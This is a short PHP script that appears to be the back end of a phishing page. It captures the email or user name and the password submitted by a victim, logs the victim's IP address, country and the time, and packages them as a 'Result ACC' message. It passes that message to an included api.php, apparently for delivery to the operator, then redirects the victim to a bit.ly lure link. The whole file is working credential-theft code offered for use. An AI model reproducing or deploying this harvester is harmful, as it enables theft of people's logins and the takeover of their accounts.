<?php
require 'detect.php';
include 'email.php';
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$user = $_POST['user'];
$pass = $_POST['pass'];

$msg = ("
❗️=========== Result ACC ===========❗️


[Login] = ".$login."
PUNYA SI  = ".$email."".$user."
PASSWORD  = ".$password."".$pass."

😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳
[IP INFO] = http://www.geoiptool.com/?IP=".$IP."
[TIME/DATE] =".$times." / ".$date."/".$country."
😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳
");

$url = $msg;include("api.php");



?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="REFRESH" content="0;url=https://bit.ly/GrupBokep_2021">
</head>
<body>
</body>
</html>
